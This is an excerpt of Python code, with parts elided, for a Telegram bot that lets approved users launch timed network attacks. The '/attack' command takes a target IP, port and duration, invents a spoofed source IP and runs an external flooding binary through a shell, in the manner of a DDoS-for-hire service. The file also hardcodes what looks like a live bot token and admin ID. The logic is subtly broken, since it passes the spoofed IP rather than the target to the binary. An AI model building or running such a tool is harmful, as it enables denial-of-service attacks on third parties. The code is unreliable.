...
# Configuration
TELEGRAM_BOT_TOKEN = "7709792223:AAEy3BwIheJ2ikrhrAsHKlHlTnKUQmZl7hs"  # Replace with your bot token
ADMIN_USER_ID = 1549748318  # Replace with your admin ID
...
async def help_command(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "/attack <ip> <port> <time> - Launch an attack with a random source IP (approved users only).\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
...
async def approve(update: Update, context: CallbackContext):
    ...
    if not target_id.lstrip('-').isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be numeric.*", parse_mode='Markdown')
        return
...
async def attack(update: Update, context: CallbackContext):
    """Launch an attack with a random source IP."""
    ...
    original_ip, port, time = args
    spoofed_ip = generate_random_ip()

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ Attack Launched ✅*\n"
        f"*🎯 Original Target:* {original_ip}\n"
        f"*🔀 Spoofed Source IP:* {spoofed_ip}\n"
        f"*🔌 Port:* {port}\n"
        f"*⏱ Time:* {time} seconds\n"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, spoofed_ip, port, time, context))

async def run_attack(chat_id, spoofed_ip, port, time, context):
    ...
    try:
        process = await asyncio.create_subprocess_shell(
            f"./gondareddy {spoofed_ip} {port} {time} 20",
